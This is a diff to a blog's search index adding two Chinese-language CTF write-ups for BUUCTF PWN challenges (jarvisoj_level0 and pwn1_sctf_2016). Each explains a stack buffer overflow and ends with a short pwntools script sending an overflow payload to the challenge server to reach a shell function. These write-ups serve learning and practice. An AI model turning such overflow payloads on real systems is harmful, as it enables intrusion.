@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-jarvisoj_level0</title>
+      <link href="/20211104-ctf-jarvisoj-level0/"/>
+      <url>/20211104-ctf-jarvisoj-level0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-jarvisoj-level0"><a href="#BUUCTF-PWN-jarvisoj-level0" class="headerlink" title="BUUCTF-PWN-jarvisoj_level0"></a>BUUCTF-PWN-jarvisoj_level0</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041745391.png" alt="image-20211104174527495"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041746934.png" alt="image-20211104174606795"></p><p>进入<code>vulnerable_function</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041747446.png" alt="image-20211104174701846"></p><p>可以看到<code>buf</code>的长度为0x80，但这个输入点可以输入0x200的长度，所以可以利用该溢出，跳转到<code>callsystem</code>函数，是典型的ret2text</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041749881.png" alt="image-20211104174910861"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25713</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041750068.png" alt="image-20211104175033227"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BUUCTF-PWN-pwn1_sctf_2016</title>
+      <link href="/20211104-ctf-pwn1-sctf-2016/"/>
+      <url>/20211104-ctf-pwn1-sctf-2016/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-pwn1-sctf-2016"><a href="#BUUCTF-PWN-pwn1-sctf-2016" class="headerlink" title="BUUCTF-PWN-pwn1_sctf_2016"></a>BUUCTF-PWN-pwn1_sctf_2016</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041601867.png" alt="image-20211104160154149"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041603959.png" alt="image-20211104160317549"></p><p>查看<code>vuln</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041602039.png" alt="image-20211104160251709"></p><p>C++写的代码不太看得懂，勉强能看出是有个<code>fgets</code>出入点，但是规定了最大输入长度32，所以没办法直接溢出</p><p>但是看到了“I”和”you“，虽然看不懂，但是运行一下试试</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041605157.png" alt="image-20211104160520774"></p><p>原来它是将“I”全部转化为”you“，隐隐约约感觉是要用这个做突破口</p><p>查看一下s的栈情况：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041610504.png" alt="image-20211104160958947"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041610591.png" alt="image-20211104161022756"></p><p>从3C到0正好是60个字符的长度，那么可以用20个“I”将它覆盖，再加4个别的字符，就可以随意跳转到别的位置</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26808</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111041615543.png" alt="image-20211104161518853"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF-PWN-warmup_csaw_2016</title>
       <link href="/20211103-ctf-warmup-csaw-2016/"/>
       <url>/20211103-ctf-warmup-csaw-2016/</url>
